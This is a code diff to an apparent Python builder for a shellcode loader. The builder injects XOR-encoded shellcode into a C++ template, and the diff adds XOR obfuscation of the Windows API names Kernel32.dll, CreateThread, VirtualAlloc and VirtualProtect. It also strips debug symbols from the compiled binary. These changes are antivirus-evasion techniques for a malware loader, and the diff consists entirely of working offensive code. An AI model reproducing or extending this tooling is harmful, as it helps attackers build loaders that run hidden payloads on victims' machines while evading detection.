@@ -23,7 +23,8 @@ def xor(data, key):
 
 if __name__ == '__main__':
     args = init_args()
-
+    
+    funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtect', '<VIRTUAL_PROTECT>')]
     with open("./Source.cpp", 'r') as f:
         source = f.read()
 
@@ -45,10 +46,20 @@ if __name__ == '__main__':
         stringConstruct += '";'
         source = source.replace('<SHELLCODE>', stringConstruct)
         source = source.replace('<XOR_KEY>', f'"{args.xor}"')
+
+        for func in funcs:
+            data = xor(func[0].encode() + b'\0', args.xor.encode())
+            stringConstruct = "\""
+            for n, i in enumerate(data):
+                stringConstruct += f"\\{hex(i)[1:]}"
+            stringConstruct += '";'
+
+            source = source.replace(func[1], stringConstruct)
+
         with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
             f.write(source)
 
-        os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release")
+        os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None")
         os.remove("ShellcodeLoaderBuilder/Source.cpp")
     except FileNotFoundError:
         print('Invalid file')
